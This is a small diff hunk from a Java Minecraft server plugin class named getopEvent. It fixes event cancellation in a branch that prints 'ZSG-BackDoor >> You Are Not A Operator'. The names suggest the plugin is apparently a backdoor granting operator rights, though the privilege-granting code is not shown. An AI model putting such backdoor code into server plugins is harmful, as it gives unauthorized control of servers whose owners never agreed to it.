@@ -27,7 +27,7 @@ public class getopEvent implements Listener {
 
             }else {
                 p.sendMessage(ChatColor.GREEN+"ZSG-BackDoor >>"+ChatColor.GOLD+"You Are Not A Operator :|");
-                event.isCancelled();
+                event.setCancelled(true);
             }
         }
 
